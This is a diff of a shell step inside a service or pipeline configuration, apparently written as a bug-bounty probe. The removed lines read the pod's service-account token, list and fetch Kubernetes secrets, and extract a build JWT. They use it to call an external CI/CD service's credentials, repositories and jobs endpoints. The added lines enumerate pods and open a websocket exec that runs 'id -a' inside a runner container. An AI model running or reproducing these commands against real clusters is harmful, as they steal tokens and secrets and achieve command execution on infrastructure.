@@ -14,22 +14,19 @@ service:
           K=https://kubernetes.default.svc
           { printf 'header = "Authorization: Bearer '; cat $T/token; printf '"\n'; } > /tmp/kc
           chmod 600 /tmp/kc
-          curl -s --config /tmp/kc -o /tmp/list --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets
-          JN=$(grep -o '"name": "build-id-jwt-[0-9a-f-]*"' /tmp/list | head -1 | cut -d'"' -f4)
-          curl -s --config /tmp/kc -o /tmp/one --cacert $T/ca.crt $K/api/v1/namespaces/$NS/secrets/$JN
-          node -e 'const fs=require("fs");const d=JSON.parse(fs.readFileSync("/tmp/one","utf8"));const t=Buffer.from(d.data.text,"base64").toString("utf8").trim();fs.writeFileSync("/tmp/jc",`header = "Authorization: Bearer ${t}"\nheader = "X-Bug-Bounty: Kristian7788"\n`);const p=t.split(".");p[2]="AAAA";fs.writeFileSync("/tmp/jbad",`header = "Authorization: Bearer ${p.join(".")}"\nheader = "X-Bug-Bounty: Kristian7788"\n`);'
-          chmod 600 /tmp/jc /tmp/jbad
-          H=https://cicd-service.cfapps.us10.hana.ondemand.com
-          echo "KPCP7788-B-MARSHALL=$(curl -s -o /tmp/b -w '%{http_code}' -X PUT --config /tmp/jc -H 'Content-Type: application/json' -d '{"general":{"buildTool":"mta"}}' $H/runs/v1/actions/marshallConfiguration)"
-          echo "KPCP7788-B-BYTES=$(wc -c < /tmp/b)"; head -c 200 /tmp/b; echo ""
-          echo "KPCP7788-B-CONTROL-BADSIG=$(curl -s -o /tmp/bc -w '%{http_code}' -X PUT --config /tmp/jbad -H 'Content-Type: application/json' -d '{"general":{"buildTool":"mta"}}' $H/runs/v1/actions/marshallConfiguration)"
-          head -c 150 /tmp/bc; echo ""
-          for EP in /v2/jobs /v2/credentials /v2/repositories /v2/pipelineDefinitions; do
-            C=$(curl -s -o /tmp/e -w '%{http_code}' --config /tmp/jc -H 'Accept: application/hal+json' $H$EP)
-            echo "KPCP7788-C $EP -> $C  bytes=$(wc -c < /tmp/e)"
-            head -c 150 /tmp/e; echo ""
-          done
-          echo "KPCP7788-D-PING=$(curl -s -o /tmp/p -w '%{http_code}' --config /tmp/jc $H/runs/v1/actions/ping)"
-          head -c 150 /tmp/p; echo ""
-          rm -f /tmp/kc /tmp/jc /tmp/jbad /tmp/one /tmp/list
-          echo "KPCP7788-DONE"
+          curl -s --config /tmp/kc -o /tmp/pods --cacert $T/ca.crt $K/api/v1/namespaces/$NS/pods
+          echo "KPX7788-NS=$NS"
+          echo "KPX7788-PODS:"
+          grep -oE '"name": "[a-z0-9.-]+"' /tmp/pods | sort -u | head -20
+          POD=$(node -e 'const d=JSON.parse(require("fs").readFileSync("/tmp/pods","utf8"));const p=d.items.find(x=>/runner|jenkinsfile/.test(x.metadata.name))||d.items[0];console.log(p.metadata.name+"|"+p.spec.containers.map(c=>c.name).join(","))')
+          PODNAME=${POD%%|*}; CONTS=${POD##*|}
+          echo "KPX7788-TARGET-POD=$PODNAME  CONTAINERS=$CONTS"
+          C1=$(echo $CONTS | cut -d, -f1)
+          KEY=$(head -c 16 /dev/urandom | base64)
+          echo "KPX7788-EXEC-STATUS=$(curl -s -o /tmp/x -D /tmp/xh -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt -N --max-time 20 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/$PODNAME/exec?container=$C1&command=id&command=-a&stdout=true&stderr=true")"
+          echo "KPX7788-EXEC-HEADERS:"; head -c 300 /tmp/xh
+          echo "KPX7788-EXEC-UID-LINE:"; strings /tmp/x 2>/dev/null | grep -aoE 'uid=[0-9]+\([a-z]+\)[^ ]*' | head -3
+          echo "KPX7788-EXEC-BYTES=$(wc -c < /tmp/x)"
+          echo "KPX7788-CONTROL-NOPOD=$(curl -s -o /dev/null -w '%{http_code}' --config /tmp/kc --cacert $T/ca.crt --max-time 15 -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H "Sec-WebSocket-Key: $KEY" -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Protocol: v4.channel.k8s.io' "$K/api/v1/namespaces/$NS/pods/kp-nonexistent-pod-7788/exec?command=id&stdout=true")"
+          rm -f /tmp/kc /tmp/pods /tmp/x /tmp/xh
+          echo "KPX7788-DONE"
